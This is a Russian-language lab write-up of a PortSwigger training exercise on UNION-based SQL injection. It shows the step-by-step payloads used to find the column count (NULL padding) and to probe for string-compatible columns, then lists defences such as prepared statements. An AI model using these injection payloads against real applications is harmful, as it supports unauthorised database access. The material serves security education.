# 📘 PortSwigger Lab: SQL injection UNION attack, determining the number of columns returned by the query

<a id="top"></a>

> 🔗 Лаба: https://portswigger.net/web-security/sql-injection/union-attacks/lab-determine-number-of-columns

---

# 📑 Оглавление

- [🎯 Цель](#goal)
- [🧠 Идея UNION attack](#idea)
- [🏗 Как работает UNION](#how)
- [🔍 Шаг 1 — Поиск SQL Injection](#step1)
- [🔍 Шаг 2 — Проверка UNION](#step2)
- [🔍 Шаг 3 — Подбор колонок](#step3)
- [🔍 Шаг 4 — Успешный payload](#step4)
- [💥 Почему атака сработала](#why)
- [🛡 Защита](#defense)
- [🛠 Чеклист](#checklist)

---

<a id="goal"></a>

# 🎯 Цель

Определить количество колонок в оригинальном SELECT-запросе через UNION SQL Injection.

---

<a id="idea"></a>

# 🧠 Идея UNION attack

`UNION` объединяет результаты нескольких SELECT-запросов.

Пример:

```sql
SELECT name,price FROM products
UNION
SELECT username,password FROM users
```

Главное правило:

```sql
SELECT a,b
UNION
SELECT c,d
```

✅ Количество колонок совпадает.

---

<a id="how"></a>

# 🏗 Как работает UNION

Backend вероятно делает:

```sql
SELECT name,description,price FROM products WHERE category='Accessories'
```

Мы не знаем:
- сколько колонок возвращается;
- какие datatype используются.

Поэтому сначала нужно определить количество колонок.

---

<a id="step1"></a>

# 🔍 Шаг 1 — Поиск SQL Injection

Тестируем:

```http
/filter?category=Accessories'
```

Если response меняется —
SQL Injection существует.

---

<a id="step2"></a>

# 🔍 Шаг 2 — Проверка UNION

Пробуем:

```http
/filter?category=Accessories' UNION SELECT NULL--
```

`NULL` используется потому что подходит почти под любой datatype.

---

<a id="step3"></a>

# 🔍 Шаг 3 — Подбор колонок

Постепенно увеличиваем количество NULL:

```sql
UNION SELECT NULL--
```

```sql
UNION SELECT NULL,NULL--
```

```sql
UNION SELECT NULL,NULL,NULL--
```

---

# Что ищем

Момент,
когда:
- ошибка исчезает;
- response становится нормальным;
- сервер отвечает `200 OK`.

---

# Что произошло в лабе

```sql
UNION SELECT NULL--
```

❌ Ошибка

```sql
UNION SELECT NULL,NULL--
```

❌ Ошибка

```sql
UNION SELECT NULL,NULL,NULL--
```

✅ Успех

```http
HTTP/2 200 OK
```

---

# Вывод

Оригинальный SELECT содержит:
# 3 колонки

---

<a id="step4"></a>

# 🔍 Шаг 4 — Успешный payload

Финальный payload:

```http
/filter?category=Accessories' UNION SELECT NULL,NULL,NULL--
```

SQL становится:

```sql
SELECT name,description,price FROM products
WHERE category='Accessories'
UNION SELECT NULL,NULL,NULL--'
```

---

# Дополнительная проверка

Можно проверить string-compatible columns:

```http
/filter?category=Accessories' UNION SELECT NULL,'a',NULL--
```

---

# Что это показало

Вторая колонка принимает string values.

---

<a id="why"></a>

# 💥 Почему атака сработала

Потому что приложение:
- вставляло input напрямую в SQL;
- не использовало prepared statements;
- позволяло изменять SELECT query.

---

<a id="defense"></a>

# 🛡 Защита

- Prepared Statements
- Parameterized Queries
- Input Validation
- Least Privilege
- WAF

Безопасный пример:

```php
$stmt = $pdo->prepare("SELECT * FROM products WHERE category=?");
```

---

<a id="checklist"></a>

# 🛠 Чеклист

- [ ] найден SQL Injection
- [ ] протестирован UNION SELECT
- [ ] найдено количество колонок
- [ ] найден valid payload
- [ ] найден string-compatible column

---

# ⬆ Наверх

[Вернуться к началу](#top)
